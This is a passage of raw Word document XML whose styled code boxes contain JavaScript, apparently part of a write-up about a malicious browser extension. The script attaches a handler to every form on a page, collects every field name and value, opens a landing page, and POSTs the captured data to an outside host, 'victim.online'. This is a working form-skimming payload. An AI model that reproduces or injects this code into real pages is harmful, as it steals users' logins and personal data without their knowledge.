                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="808080"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>//called when a submit event happens</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="808080"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">function </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>formSubmit</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>(event) {</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    window.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>open</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>'https://theantisocialengineer.com/chrome-extension-landing-page/'</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">var </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">xhr = </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">new </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>XMLHttpRequest()</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>xhr.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>open</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>'POST'</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>'http://victim.online'</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">var </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">string = </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>''</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="808080"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">// iterate over all of the form fields and urlencode them. There'll be an extra </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="808080"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">        </w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2A251BB7" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRDefault="006A6E3D" w:rsidP="007652E7">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="808080"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="808080"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>&amp; at the end but who cares</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="808080"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">for </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">index </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">= </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="6897BB"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>0</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">; </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">index </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>&lt; event.target.elements.length</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">; </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>++</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>index</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>) {</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">        string = string + event.target.elements[</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>index</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>].</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">name </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">+ </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">'=' </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">+ </w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="6DF222E4" w14:textId="3147C146" w:rsidR="006A6E3D" w:rsidRDefault="006A6E3D" w:rsidP="007652E7">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">        </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>event.target.elements[</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>index</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>].</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">value </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">+ </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>'&amp;'</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    xhr.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>setRequestHeader</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>"Content-type"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>"application/x-www-form-urlencoded"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>xhr.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>send</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>(string)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="808080"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>// add an event listener to the submit event for every form in the page</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="808080"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">for </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">index </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">= </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="6897BB"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>0</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">; </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">index </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>&lt; forms.length</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">; </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>++</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>index</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>) {</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    forms[</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>index</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>].</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>addEventListener</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>'submit'</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>formSubmit</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>}</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5777C7BF" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="007652E7" w:rsidRDefault="006A6E3D" w:rsidP="007652E7">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="0E65E42D" w14:textId="2CB020BC" w:rsidR="006A6E3D" w:rsidRDefault="006A6E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100AD0" id="_x0000_s1036" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:.35pt;margin-top:37.8pt;width:475.5pt;height:250.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" filled="f" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="2FCA1B47" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRDefault="006A6E3D" w:rsidP="007652E7">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="808080"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="808080"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>//get every form</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="808080"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">var </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
